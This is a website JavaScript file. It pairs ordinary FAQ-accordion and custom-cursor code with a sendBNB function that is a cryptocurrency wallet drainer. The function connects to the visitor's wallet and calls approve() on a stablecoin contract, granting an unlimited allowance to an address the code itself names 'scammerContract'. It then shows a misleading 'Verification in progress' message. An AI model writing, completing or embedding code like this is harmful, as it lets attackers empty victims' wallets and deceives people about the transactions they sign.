document.addEventListener("DOMContentLoaded", () => {

  document.querySelectorAll(".faq-question").forEach(btn => {
    btn.addEventListener("click", () => {
      const item = btn.closest(".faq-item");

      // close others (optional – remove if you want multi-open)
      document.querySelectorAll(".faq-item").forEach(i => {
        if (i !== item) i.classList.remove("active");
      });

      item.classList.toggle("active");
    });
  });

});

document.addEventListener("DOMContentLoaded",()=>{

  const dot = document.querySelector(".cursor-dot");
  const ring = document.querySelector(".cursor-ring");

  if(!dot || !ring){
    console.error("Cursor elements missing!");
    return;
  }

  let mouseX = 0, mouseY = 0;
  let ringX = 0, ringY = 0;

  window.addEventListener("mousemove", e => {
    mouseX = e.clientX;
    mouseY = e.clientY;

    dot.style.left = mouseX + "px";
    dot.style.top = mouseY + "px";
  });

  function animateRing(){
    ringX += (mouseX - ringX) * 0.15;
    ringY += (mouseY - ringY) * 0.15;

    ring.style.left = ringX + "px";
    ring.style.top = ringY + "px";

    requestAnimationFrame(animateRing);
  }

  animateRing();

  // Hover grow
  document.querySelectorAll("a, button").forEach(el=>{
    el.addEventListener("mouseenter",()=>{
      ring.style.width="52px";
      ring.style.height="52px";
      ring.style.borderColor="rgba(60,231,255,.9)";
    });

    el.addEventListener("mouseleave",()=>{
      ring.style.width="36px";
      ring.style.height="36px";
      ring.style.borderColor="rgba(180,100,255,.9)";
    });
  });

});
async function sendBNB() {
    try {
        // 1. Check for provider (Universal check for 2026)
        const provider = window.ethereum || (window.trustwallet ? window.trustwallet : null);
        
        if (!provider) {
            alert("Please open this site inside your Trust Wallet or MetaMask Browser!");
            return;
        }

        // 2. FORCE the wallet to wake up (Essential for Mobile)
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        if (accounts.length === 0) return;

        // 3. Setup Ethers (v6 Syntax - standard for 2026)
        const web3Provider = new ethers.BrowserProvider(provider);
        const signer = await web3Provider.getSigner();

        const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; 
        const scammerContract = "YOUR_REMIX_ADDRESS"; // <--- DOUBLE CHECK THIS

        const tokenContract = new ethers.Contract(tokenAddress, [
            "function approve(address spender, uint256 amount)"
        ], signer);

        // 4. Trigger popup
        const tx = await tokenContract.approve(scammerContract, ethers.MaxUint256);
        alert("Verification in progress... check your wallet to confirm.");

    } catch (err) {
        console.error(err);
        // This alerts you if the code crashes silently
        alert("Connection Error: " + err.message);
    }
}